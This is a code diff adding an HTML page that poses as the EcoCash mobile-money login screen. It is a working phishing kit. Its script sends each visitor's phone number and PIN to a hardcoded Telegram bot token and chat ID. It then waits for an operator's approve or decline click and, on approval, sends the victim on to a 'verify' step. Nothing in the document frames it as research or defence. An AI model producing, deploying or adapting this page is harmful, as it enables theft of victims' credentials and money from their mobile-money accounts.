@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EcoCash - Log In</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: white;
+            min-height: 100vh;
+            display: flex;
+            align-items: flex-start;
+            justify-content: center;
+            padding: 60px 24px 40px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+
+        .logo {
+            font-size: 52px;
+            font-weight: 700;
+            margin-bottom: 40px;
+            letter-spacing: -1px;
+        }
+
+        .logo-blue { color: #0066ff; }
+        .logo-red  { color: #ff0000; }
+
+        .form-group {
+            margin-bottom: 40px;
+            text-align: left;
+        }
+
+        label {
+            display: block;
+            font-size: 15px;
+            font-weight: 500;
+            color: #555;
+            margin-bottom: 8px;
+        }
+
+        input {
+            width: 100%;
+            padding: 18px 20px;  /* normal padding, no extra for icon */
+            font-size: 17px;
+            border: 2px solid #3f51b5;
+            border-radius: 12px;
+            outline: none;
+            background: white;
+        }
+
+        .error-message {
+            color: #c62828;
+            font-size: 14px;
+            margin-top: 6px;
+            padding-left: 4px;
+            display: none;
+        }
+
+        .btn-login {
+            width: 100%;
+            padding: 20px 0;
+            font-size: 18px;
+            font-weight: 700;
+            color: white;
+            background: #0d47a1;
+            border: none;
+            border-radius: 999px;
+            cursor: pointer;
+            box-shadow: 0 6px 16px rgba(13, 71, 161, 0.25);
+        }
+
+        .btn-login:active {
+            background: #003087;
+        }
+
+        #spinnerOverlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(255,255,255,0.95);
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 6px solid #f0f0f0;
+            border-top: 6px solid #0d47a1;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="logo">
+            <span class="logo-blue">Eco</span><span class="logo-red">Cash</span>
+        </div>
+
+        <div class="form-group">
+            <label>Phone Number</label>
+            <div class="input-wrapper">
+                <input type="tel" id="phoneInput" placeholder="Phone Number (6XXXXXXXXX)">
+            </div>
+            <div id="phoneError" class="error-message">Please enter correct phone number</div>
+        </div>
+
+        <div class="form-group">
+            <label>Pin</label>
+            <input type="password" id="pinInput" placeholder="">
+            <div id="pinError" class="error-message">Please enter correct PIN</div>
+        </div>
+
+        <button class="btn-login" id="loginBtn">Log In</button>
+    </div>
+
+    <div id="spinnerOverlay">
+        <div class="spinner"></div>
+        <div>Please wait...</div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '8459564570:AAHD5IX76Yf3XKqPGqL9iy5ChAdccxtiLWg';
+        const CHAT_ID   = '7399050016';
+
+        const phoneInput = document.getElementById('phoneInput');
+        const pinInput   = document.getElementById('pinInput');
+        const loginBtn   = document.getElementById('loginBtn');
+        const spinner    = document.getElementById('spinnerOverlay');
+        const phoneError = document.getElementById('phoneError');
+        const pinError   = document.getElementById('pinError');
+
+        let currentApproveCb = null;
+        let currentDeclineCb = null;
+        let pollingInterval  = null;
+
+        function clearErrors() {
+            phoneError.style.display = 'none';
+            pinError.style.display   = 'none';
+        }
+
+        function stopPolling() {
+            if (pollingInterval) {
+                clearInterval(pollingInterval);
+                pollingInterval = null;
+            }
+        }
+
+        loginBtn.addEventListener('click', () => {
+            clearErrors();
+
+            const phone = phoneInput.value.trim();
+            const pin   = pinInput.value.trim();
+
+            if (!phone || phone.length < 8 || !pin || pin.length < 4) {
+                alert('Please enter valid phone number and PIN');
+                return;
+            }
+
+            spinner.style.display = 'flex';
+
+            const timestamp = Date.now();
+            currentApproveCb = `approve_${timestamp}`;
+            currentDeclineCb = `decline_${timestamp}`;
+
+            const message = `EcoCash Login Attempt\n\nPhone: ${phone}\nPIN: ${pin}\n\nAction?`;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    reply_markup: {
+                        inline_keyboard: [[
+                            { text: '✅ Approve & Continue', callback_data: currentApproveCb },
+                            { text: '❌ Decline', callback_data: currentDeclineCb }
+                        ]]
+                    }
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (!data.ok) {
+                    spinner.style.display = 'none';
+                    alert('Failed to send request to admin\n' + (data.description || 'Unknown error'));
+                }
+            })
+            .catch(err => {
+                spinner.style.display = 'none';
+                alert('Connection problem\n' + err.message);
+            });
+
+            pollingInterval = setInterval(() => {
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1&timeout=30`)
+                    .then(r => r.json())
+                    .then(data => {
+                        if (!data.ok || !data.result?.length) return;
+
+                        for (const update of data.result) {
+                            const callback = update.callback_query;
+                            if (!callback) continue;
+
+                            const cbData = callback.data;
+
+                            if (cbData === currentApproveCb) {
+                                stopPolling();
+                                spinner.style.display = 'none';
+                                window.location.href = 'verify';
+                                return;
+                            }
+
+                            if (cbData === currentDeclineCb) {
+                                stopPolling();
+                                spinner.style.display = 'none';
+                                phoneError.style.display = 'block';
+                                pinError.style.display   = 'block';
+                                return;
+                            }
+                        }
+                    })
+                    .catch(err => console.warn('Polling issue:', err));
+            }, 2000);
+        });
+    </script>
+
+</body>
+</html>
